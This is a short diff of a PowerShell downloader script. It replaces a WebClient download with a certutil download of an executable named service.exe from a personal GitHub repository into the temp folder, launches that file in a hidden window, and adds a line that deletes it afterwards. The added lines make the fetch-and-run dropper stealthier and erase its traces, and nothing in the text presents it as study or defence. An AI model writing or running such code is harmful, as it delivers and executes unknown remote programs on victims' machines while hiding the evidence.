@@ -1,2 +1,3 @@
-(New-Object Net.WebClient).DownloadFile('https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/service.exe', "$env:TEMP\service.exe")
+certutil -urlcache -split -f https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/service.exe $env:TEMP\service.exe
 Start-Process "$env:TEMP\service.exe" -WindowStyle Hidden
+Remove-Item "$env:TEMP\service.exe" -Force
